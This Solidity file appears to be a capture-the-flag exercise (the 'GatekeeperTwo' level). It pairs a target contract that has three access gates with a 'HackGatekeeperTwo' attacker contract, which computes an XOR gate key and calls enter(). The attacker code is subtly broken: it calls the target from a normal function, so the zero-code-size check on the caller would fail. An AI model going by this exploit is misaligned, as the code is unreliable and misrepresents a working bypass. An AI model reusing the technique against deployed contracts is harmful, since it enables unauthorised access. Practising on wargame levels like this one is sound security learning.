// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }

  function getCodeSize() public view returns (uint){
    uint x;
    assembly { x := extcodesize(caller()) }
    return x;
  }
}

contract HackGatekeeperTwo {
  function getGateKey() public view returns (bytes8) {
     uint64 input1 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
     uint64 input2 = type(uint64).max;
     return bytes8(input1 ^ input2);
  }

  function enter(address gate) public {
      bytes8 gateKey = getGateKey();
      (bool success, ) = gate.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
      require(success, "failed to enter");
  }

  function getCodeSize(address gate) public {
      (bool success, ) = gate.call(abi.encodeWithSignature("getCodeSize()"));
      require(success, "failed to get code size");
  }
}